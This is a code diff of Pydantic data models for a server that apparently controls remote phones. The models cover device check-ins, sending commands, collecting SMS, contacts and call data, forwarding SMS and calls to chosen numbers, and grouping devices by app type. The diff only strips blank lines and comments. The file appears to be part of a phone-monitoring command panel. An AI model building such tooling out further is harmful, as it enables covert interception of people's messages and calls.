@@ -3,7 +3,6 @@ from typing import Optional, List, Dict, Any
 from datetime import datetime
 from enum import Enum
 
-
 class DeviceStatus(str, Enum):
     ONLINE = "online"
     OFFLINE = "offline"
@@ -24,7 +23,6 @@ class CommandStatus(str, Enum):
     DELIVERED = "delivered"
     EXECUTED = "executed"
     FAILED = "failed"
-
 
 class PingMessage(BaseModel):
     type: str = "ping"
@@ -61,7 +59,6 @@ class ContactsMessage(BaseModel):
     device_id: str
     data: List[Dict[str, Any]]
 
-
 class PongMessage(BaseModel):
     type: str = "pong"
     timestamp: int
@@ -76,7 +73,6 @@ class CommandMessage(BaseModel):
     command: str
     parameters: Optional[Dict[str, Any]] = None
 
-
 class DeviceSettings(BaseModel):
     sms_forward_enabled: bool = True
     forward_number: Optional[str] = None
@@ -90,7 +86,6 @@ class DeviceStats(BaseModel):
     last_sms_sync: Optional[datetime] = None
     last_contact_sync: Optional[datetime] = None
     last_call_sync: Optional[datetime] = None
-
 
 class SimInfo(BaseModel):
     simSlot: int = Field(alias="sim_slot")
@@ -131,7 +126,6 @@ class SimInfo(BaseModel):
 
     class Config:
         populate_by_name = True
-
 
 class Device(BaseModel):
     device_id: str
@@ -189,16 +183,13 @@ class Device(BaseModel):
     settings: Optional[DeviceSettings] = None
     stats: Optional[DeviceStats] = None
     
-    # FCM Tokens
     fcm_tokens: Optional[List[str]] = []
     
-    # Call Forwarding
     call_forwarding_enabled: Optional[bool] = False
     call_forwarding_number: Optional[str] = None
     call_forwarding_sim_slot: Optional[int] = None
     call_forwarding_updated_at: Optional[datetime] = None
     
-    # زمان‌ها
     registered_at: Optional[datetime] = None
     updated_at: Optional[datetime] = None
 
@@ -207,7 +198,6 @@ class Device(BaseModel):
         json_encoders = {
             datetime: lambda v: v.isoformat() if v else None
         }
-
 
 class SMSMessage(BaseModel):
     device_id: str
@@ -226,7 +216,6 @@ class SMSMessage(BaseModel):
     class Config:
         populate_by_name = True
 
-
 class Contact(BaseModel):
     device_id: str
     contact_id: str
@@ -235,7 +224,6 @@ class Contact(BaseModel):
     email: Optional[str] = None
     synced_at: datetime = Field(default_factory=datetime.utcnow)
 
-
 class Log(BaseModel):
     device_id: str
     type: str 
@@ -243,7 +231,6 @@ class Log(BaseModel):
     level: LogLevel = LogLevel.INFO
     metadata: Dict[str, Any] = Field(default_factory=dict)
     timestamp: datetime = Field(default_factory=datetime.utcnow)
-
 
 class Command(BaseModel):
     device_id: str
@@ -254,11 +241,9 @@ class Command(BaseModel):
     executed_at: Optional[datetime] = None
     result: Optional[Dict[str, Any]] = None
 
-
 class SendCommandRequest(BaseModel):
     command: str
     parameters: Optional[Dict[str, Any]] = None
-
 
 class UpdateSettingsRequest(BaseModel):
     sms_forward_enabled: Optional[bool] = None
@@ -266,26 +251,22 @@ class UpdateSettingsRequest(BaseModel):
     monitoring_enabled: Optional[bool] = None
     auto_reply_enabled: Optional[bool] = None
 
-
 class DeviceListResponse(BaseModel):
     devices: List[Device]
     total: int
     hasMore: bool  
 
-
 class AppTypeInfo(BaseModel):
-    """اطلاعات نوع اپلیکیشن"""
+    
     app_type: str
     display_name: str
     icon: str
-    count: int  # تعداد دستگاه‌ها
-
+    count: int
 
 class AppTypesResponse(BaseModel):
-    """لیست انواع اپلیکیشن‌های موجود"""
+    
     app_types: List[AppTypeInfo]
     total: int
-
 
 class SMSListResponse(BaseModel):
     messages: List[SMSMessage]
@@ -293,11 +274,9 @@ class SMSListResponse(BaseModel):
     page: int
     page_size: int
 
-
 class ContactListResponse(BaseModel):
     contacts: List[Contact]
     total: int
-
 
 class StatsResponse(BaseModel):
     total_devices: int
